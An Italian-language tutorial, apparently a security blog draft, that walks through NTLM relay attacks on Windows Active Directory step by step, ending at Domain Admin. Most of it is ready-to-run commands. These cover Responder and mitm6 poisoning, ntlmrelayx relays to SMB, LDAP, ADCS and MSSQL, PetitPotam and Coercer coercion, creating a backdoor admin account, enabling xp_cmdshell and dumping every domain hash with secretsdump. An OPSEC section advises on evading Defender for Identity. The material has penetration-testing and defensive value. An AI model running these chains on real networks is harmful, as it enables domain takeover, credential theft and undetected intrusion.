---
title: 'NTLM Relay Attack: Setup Completo, Chain verso Domain Admin e Bypass 2026'
slug: ntlm-relay
description: 'NTLM Relay dalla teoria all''exploitation: Responder, ntlmrelayx, relay verso SMB/LDAP/ADCS, coercizione PetitPotam, IPv6 mitm6 e chain Domain Admin. Workflow reale per pentest enterprise.'
image: /ntlm-relay-attack-responder-ntlmrelayx.webp
draft: true
date: 2026-06-18T00:00:00.000Z
categories:
  - networking
subcategories:
  - servizi
tags:
  - ntlmrelayx
  - smb relay
  - responder NTLM
  - relay attack Active Directory 2026
---

# NTLM Relay Attack: Come Funziona, Setup Completo e Chain verso Domain Admin

Negli ambienti Windows enterprise, quando un computer non trova un hostname via DNS, lo annuncia sulla rete chiedendo "chi è questo server?". Chiunque risponda per primo viene considerato attendibile. NTLM Relay sfrutta esattamente questo: si mette in mezzo, si finge il server cercato, riceve le credenziali crittografate dell'utente — e invece di craccarle, le inoltra in tempo reale verso un altro sistema per autenticarsi come quella persona.

Il risultato è accesso non autorizzato senza conoscere nessuna password, spesso con privilegi amministrativi, in ambienti reali con configurazioni di default. In un pentest enterprise questa tecnica porta regolarmente a Domain Admin nel giro di minuti.

***

## Come Funziona il Relay: Il Meccanismo Reale

NTLM è un protocollo challenge-response. Quando un client si autentica:

1. Invia `NEGOTIATE` (voglio autenticarmi)
2. Riceve un `CHALLENGE` casuale dal server
3. Calcola una risposta crittografata usando il suo hash NT e invia `AUTHENTICATE`

Il relay intercetta questo flusso e lo **proxy-izza verso un altro target**. Il target riceve una challenge legittima, il client risponde a quella challenge, e il relay ottiene una sessione autenticata sul target — tutto senza toccare la password.

```
[Vittima] ──AUTHENTICATE──→ [Attacker/ntlmrelayx] ──relay──→ [Target]
                                                               ← sessione aperta
```

**Condizione critica: SMB Signing.** Il relay SMB funziona solo su host con signing disabilitato. I Domain Controller lo hanno abilitato di default. Le workstation no.

```bash
# Verifica quali host hanno SMB signing disabilitato
nxc smb 192.168.1.0/24 --gen-relay-list targets.txt
# targets.txt = host attaccabili
```

***

## Fase 1 — Cattura dell'Autenticazione

### LLMNR/NBT-NS Poisoning con Responder

```bash
# IMPORTANTE: disabilita SMB e HTTP in Responder.conf
# (ntlmrelayx userà quelle porte)
sed -i 's/HTTP = On/HTTP = Off/' /etc/responder/Responder.conf
sed -i 's/SMB = On/SMB = Off/' /etc/responder/Responder.conf

# Avvia Responder
responder -I eth0 -dwF
```

Ogni host che cerca un nome non risolvibile via DNS invierà le sue credenziali NTLM verso di te.

### IPv6 + mitm6 (spesso più efficace nel 2025)

Windows preferisce IPv6 su IPv4 e invia richieste DHCPv6 periodicamente. `mitm6` si presenta come server DHCPv6 e DNS per la rete, poi redirige il traffico verso il relay.

```bash
# Terminale 1
mitm6 -d domain.local

# Terminale 2
ntlmrelayx.py -6 -t ldaps://DC_IP -smb2support --delegate-access
```

Questo bypass funziona anche in ambienti con SMB Signing su tutti gli host, perché il relay avviene verso LDAP sul DC via IPv6.

Vedi: [Responder](https://hackita.it/articoli/responder/)

***

## Fase 2 — ntlmrelayx: Configurazioni per Ogni Target

### Relay verso SMB → shell diretta

```bash
ntlmrelayx.py -tf targets.txt -smb2support

# Con esecuzione comando
ntlmrelayx.py -tf targets.txt -smb2support -c "net user attacker P@ss123! /add && net localgroup administrators attacker /add"

# Shell interattiva
ntlmrelayx.py -tf targets.txt -smb2support -i
# Poi: nc 127.0.0.1 11000
```

### Relay verso LDAP → dump AD o escalation

```bash
# Dump di tutti gli utenti/computer del dominio
ntlmrelayx.py -t ldap://DC_IP -smb2support

# Escalation: aggiungi utente ai Domain Admins
ntlmrelayx.py -t ldap://DC_IP -smb2support --escalate-user lowpriv_user

# Shadow Credentials (se hai scrittura su msDS-KeyCredentialLink)
ntlmrelayx.py -t ldap://DC_IP --shadow-credentials --shadow-target TARGET_USER --no-dump --no-acl
```

**Nota LDAP:** Windows Server 2025 abilita LDAP signing di default. Usa `ldaps://` con `--remove-mic` o verifica la configurazione target prima.

### Relay verso ADCS Web Enrollment → Domain Admin via certificato

Il chain più impattante. Relay il machine account del DC verso la CA, ottieni un certificato del DC, e via PKINIT hai l'hash NT di DC$ → DCSync.

```bash
# Terminale 1 — relay verso CA
ntlmrelayx.py -t http://CA_SERVER/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController

# Terminale 2 — coerci il DC ad autenticarsi
python3 PetitPotam.py -u lowpriv_user -p Password123 KALI_IP DC_IP

# Quando arriva il certificato base64:
certipy-ad auth -pfx dc.pfx -dc-ip DC_IP
# → NT hash di DC$ → DCSync
```

Vedi: [Certipy e ADCS](https://hackita.it/articoli/certipy/)

### Relay verso MSSQL → xp\_cmdshell

```bash
# Terminale 1
ntlmrelayx.py -t mssql://MSSQL_IP -smb2support -socks

# Terminale 2 — usa la sessione via socks
proxychains4 mssqlclient.py DOMAIN/svc_sql@MSSQL_IP -windows-auth -no-pass

# In mssqlclient
SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
SQL> EXEC xp_cmdshell 'whoami';
```

### RBCD Attack via Relay LDAP (senza signing)

Quando hai un relay LDAP su un DC senza signing obbligatorio:

```bash
ntlmrelayx.py -t ldaps://DC_IP -smb2support --delegate-access --no-dump --no-acl
```

ntlmrelayx crea automaticamente un computer account, configura Resource-Based Constrained Delegation, e ti fornisce i comandi per ottenere un TGT come qualsiasi utente della macchina target.

***

## Coercizione: Forzare l'Autenticazione

Non sempre aspetti che qualcuno si autentichi spontaneamente. Puoi forzare un host — tipicamente il DC — a connettersi verso di te.

| Tool         | Protocollo | Funziona senza credenziali |
| ------------ | ---------- | -------------------------- |
| PetitPotam   | MS-EFSRPC  | Sì (ambienti non patchati) |
| PrinterBug   | MS-RPRN    | No                         |
| DFSCoerce    | MS-DFSNM   | No                         |
| ShadowCoerce | MS-FSRVP   | No                         |
| Coercer      | Multi      | Automatico                 |

```bash
# Coercer — prova automaticamente tutti i metodi disponibili
coercer coerce -u user -p Password123 -d domain.local \
  --listener-ip KALI_IP --target-ip DC_IP

# PrinterBug manuale
python3 printerbug.py 'domain/user:pass@DC_IP' KALI_IP
```

**Decision point:** se il DC è patchato contro PetitPotam (KB5005413), prova DFSCoerce o Coercer con tutti i metodi. In ambienti reali spesso solo uno funziona.

***

## Multi-Relay e SOCKS

Con SOCKS puoi mantenere sessioni aperte e usarle più volte con tool diversi:

```bash
ntlmrelayx.py -tf targets.txt -smb2support -socks

# Visualizza sessioni attive
ntlmrelayx> socks
Protocol  Target          Username         Port
--------  --------------  ---------------  ----
SMB       192.168.1.50    DOMAIN\jsmith    445

# Usa le sessioni con proxychains
proxychains4 smbclient //192.168.1.50/C$ -U 'DOMAIN\jsmith%nopass' --pw-nt-hash
proxychains4 secretsdump.py DOMAIN/jsmith@192.168.1.50 -no-pass
```

***

## Attack Chain Completa: da Zero Credenziali a Domain Admin

Questo è il workflow reale che funziona nella maggior parte degli ambienti enterprise non hardened:

```
1. Posizione: rete interna, zero credenziali

2. mitm6 + ntlmrelayx verso ldaps://DC_IP --delegate-access
   → Windows invia DHCPv6 request → mitm6 risponde → relay LDAP
   → computer account ATTACKER$ creato, RBCD configurato su un target

3. getST.py per ottenere TGT via RBCD
   getST.py -spn cifs/TARGET -impersonate Administrator domain/ATTACKER$:pass

4. KRB5CCNAME=Administrator.ccache secretsdump.py -k DC_IP
   → tutti gli hash del dominio

5. Pass-the-Hash su qualsiasi host → movimento laterale completo
```

Documentazione tecnica di riferimento: [The Hacker Recipes — NTLM Relay](https://www.thehacker.recipes/ad/movement/ntlm/relay) e il whitepaper SpecterOps sulle NTLM Relay techniques.

***

## OPSEC

* Responder e mitm6 generano traffico DHCPv6/LLMNR rilevabile da qualsiasi NIDS. Usa finestre temporali brevi.
* ntlmrelayx con `-smb2support` e `-i` lascia sessioni aperte — limita il numero di connessioni simultanee.
* Su ambienti con Microsoft Defender for Identity (MDI), le LDAP relay query verso il DC triggerano alert. Usa `--no-dump --no-acl` per ridurre il rumore.
* Le connessioni SOCKS passano inosservate più a lungo. Preferisci SOCKS + proxychains su esecuzione diretta dei comandi.

***

*MITRE ATT\&CK: T1557.001 (LLMNR/NBT-NS Poisoning and SMB Relay), T1187 (Forced Authentication), T1090 (Proxy), TA0008 (Lateral Movement)*
